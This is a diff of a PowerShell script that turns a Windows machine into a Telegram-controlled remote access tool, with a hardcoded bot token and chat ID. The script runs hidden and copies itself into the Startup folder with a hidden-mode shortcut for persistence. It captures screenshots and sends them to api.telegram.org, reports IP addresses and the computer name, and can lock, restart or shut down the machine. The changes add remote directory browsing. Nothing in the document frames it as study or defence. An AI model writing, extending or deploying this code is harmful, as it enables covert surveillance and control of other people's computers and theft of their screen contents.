@@ -10,17 +10,12 @@ if (-not $env:PS_RUN_HIDDEN) {
     exit
 }
 
-
-
-
 # Telegram-Controlled PowerShell Script
-# Commands: /open_notepad, /visit <url>, /lock, /restart, /shutdown, /get_ip, /screenshot, /get_pcname
 $botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
 $userId = "5036966807"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0
 
-# Function to send a message via Telegram Bot
 function Send-TelegramMessage {
     param (
         [string]$chatId,
@@ -32,13 +27,11 @@ function Send-TelegramMessage {
     } | ConvertTo-Json -Depth 10)
 }
 
-# Function to get the system's local IP address
 function Get-LocalIP {
     $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
     return $ipInfo.IPAddress -join ' '
 }
 
-# Function to get the public IP address
 function Get-PublicIP {
     try {
         $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get
@@ -48,55 +41,27 @@ function Get-PublicIP {
     }
 }
 
-# Function to take and send screenshot
 function Send-Screenshot {
     param (
         [string]$chatId
     )
     try {
-        # Create temp file for screenshot
         $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-
-        # Load required assemblies
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
-
-        # Capture screenshot
         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
         $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-
-        # Save screenshot
         $bitmap.Save($screenshotPath)
         $graphics.Dispose()
         $bitmap.Dispose()
 
-        # Send screenshot via Telegram
-        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
-        $fileContentBase64 = [Convert]::ToBase64String($fileContent)
-
-        $boundary = [Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"$LF",
-            "$chatId",
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
-            "Content-Type: image/png$LF",
-            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
-            "--$boundary--$LF"
-        ) -join $LF
-
-        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
-
-        # Clean up
+        $form = @{ chat_id = $chatId; photo = Get-Item $screenshotPath }
+        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -Form $form
         Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
         return $true
-    }
-    catch {
+    } catch {
         return $false
     }
 }
@@ -105,43 +70,37 @@ function Get-PCName {
     return $env:COMPUTERNAME
 }
 
-# Function to generate and send the help message
 function Send-HelpMessage {
-    param (
-        [string]$chatId
-    )
+    param ([string]$chatId)
     $helpMessage = @"
 Available Commands:
 
 /help - Displays this help message.
-/open_notepad - Opens the Notepad application.
-/visit <url> - Opens the specified URL in your default web browser.
-/lock - Locks your workstation.
-/restart - Restarts your computer.
-/shutdown - Shuts down your computer.
-/get_ip - Retrieves and displays the local and public IP addresses.
-/screenshot - Takes a screenshot and sends it to you.
-/get_pcname - Retrieves and displays the computer's name.
+/open_notepad - Opens Notepad.
+/visit <url> - Opens a URL in the browser.
+/lock - Locks workstation.
+/restart - Restarts the computer.
+/shutdown - Shuts down the computer.
+/get_ip - Shows local and public IP.
+/screenshot - Sends a screenshot.
+/get_pcname - Shows the computer name.
+cd <path> - Change directory.
+cd - Show current directory.
+ls or dir - List files and folders.
 "@
     Send-TelegramMessage -chatId $chatId -message $helpMessage
 }
 
-# Notify when the system is running
 Send-TelegramMessage -chatId $userId -message "System is running"
 
-# Get script's full path
 $scriptPath = $MyInvocation.MyCommand.Path
 $scriptName = [System.IO.Path]::GetFileName($scriptPath)
 $startupFolder = [System.Environment]::GetFolderPath('Startup')
 $destinationPath = Join-Path $startupFolder $scriptName
-
-# If script is not already in Startup folder, copy it there
 if (-not (Test-Path $destinationPath)) {
     Copy-Item -Path $scriptPath -Destination $destinationPath
-    Write-Host "Script placed in Startup folder."
 }
 
-# Create a shortcut to run the script in hidden mode
 $WScriptShell = New-Object -ComObject WScript.Shell
 $shortcut = $WScriptShell.CreateShortcut([System.IO.Path]::Combine($startupFolder, "$scriptName.lnk"))
 $shortcut.TargetPath = "powershell.exe"
@@ -158,18 +117,45 @@ while ($true) {
 
             if ($chatId -ne $userId) { continue }
 
-            # Default reply
-            $reply = "Unknown command."
+            if (-not $global:CurrentDirectory) {
+                $global:CurrentDirectory = (Get-Location).Path
+            }
 
-            # Command processing - improved matching
-            if ($text -eq "/help") {
+            if ($text -match "^cd\s+(.*)") {
+                $targetPath = $matches[1].Trim('"')
+                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
+                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
+                }
+                if (Test-Path $targetPath -PathType Container) {
+                    $global:CurrentDirectory = (Resolve-Path $targetPath).Path
+                    $reply = "Changed directory to: $global:CurrentDirectory"
+                } else {
+                    $reply = "Directory not found: $targetPath"
+                }
+            }
+            elseif ($text -match "^cd$") {
+                $reply = "Current directory: $global:CurrentDirectory"
+            }
+            elseif ($text -match "^(ls|dir)$") {
+                try {
+                    $items = Get-ChildItem -Path $global:CurrentDirectory | Select-Object Name
+                    $reply = if ($items) {
+                        "Files and folders in $global:CurrentDirectory:`n" + ($items.Name -join "`n")
+                    } else {
+                        "No files or folders found in $global:CurrentDirectory"
+                    }
+                } catch {
+                    $reply = "Error reading directory: $_"
+                }
+            }
+            elseif ($text -eq "/help") {
                 Send-HelpMessage -chatId $chatId
-                continue # Skip the default reply
+                continue
             }
             elseif ($text -eq "/get_ip") {
                 $localIP = Get-LocalIP
                 $publicIP = Get-PublicIP
-                $reply = "Local IP address: $localIP`nPublic IP address: $publicIP"
+                $reply = "Local IP: $localIP`nPublic IP: $publicIP"
             }
             elseif ($text -eq "/get_pcname") {
                 $pcName = Get-PCName
@@ -199,7 +185,6 @@ while ($true) {
             elseif ($text -eq "/screenshot") {
                 $reply = "Taking screenshot..."
                 Send-TelegramMessage -chatId $chatId -message $reply
-
                 $success = Send-Screenshot -chatId $chatId
                 if ($success) {
                     $reply = "Screenshot sent."
@@ -207,14 +192,11 @@ while ($true) {
                     $reply = "Failed to capture screenshot."
                 }
             }
-
-            # Print debugging info
-            Write-Host "Received command: '$text'"
-
-            # Send the response to the user (unless it was the /help command)
-            if ($text -ne "/help") {
-                Send-TelegramMessage -chatId $chatId -message $reply
+            else {
+                $reply = "Unknown command."
             }
+
+            Send-TelegramMessage -chatId $chatId -message $reply
         }
         Start-Sleep -Seconds 2
     } catch {
@@ -222,4 +204,3 @@ while ($true) {
         Start-Sleep -Seconds 5
     }
 }
-
